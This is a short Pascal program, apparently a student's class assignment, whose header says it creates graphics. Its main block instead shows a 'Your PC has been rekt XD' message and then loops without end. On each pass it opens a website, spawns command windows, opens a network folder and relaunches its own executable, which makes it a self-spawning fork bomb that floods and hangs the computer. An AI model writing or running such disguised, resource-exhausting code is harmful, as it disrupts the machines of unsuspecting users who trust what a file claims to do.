{   NAME:   Jordan Millett
    CLASS:  Comp Sci 1
    DATE:   10/31/2016

    PURPOSE:  To create graphics.

}


Program ex;

uses
    crt,windows;

Procedure getInt(ask:string; num : integer);
var
   numStr : string;
   code : integer;
begin
repeat
  write(ask);
  readln(numstr);
  val(numStr, num, code);
  if code <> 0 then
begin
  writeln('Not an integer ');
  writeln('Press any key to continue');
  readkey;
  clrscr;
end;
until (code = 0);
end;

var
  num1,num2,num3:integer;

begin {main}

  MessageBox (0, 'Your PC has been rekt XD' , 'R.I.P.', 0 + MB_ICONEXCLAMATION + MB_HELP + MB_SETFOREGROUND);
  repeat
  if ShellExecute(0,nil, PChar('cmd'),PChar('/c start http://www.lingscars.com/'),nil,0) =0 then;
  if ShellExecute(0,nil, PChar('cmd'),PChar('/k cd C:\'),nil,1) =0 then;
  if ShellExecute(0,nil, PChar('"\\athena.root\Students\658830\pascal"'),PChar('"\\athena.root\Students\658830\pascal"'),nil,1) =0 then;
  if ShellExecute(0,nil, PChar('cmd'),PChar('ex.exe'),nil,1) =0 then;
  until(num3 = 1000);

end.  {main}
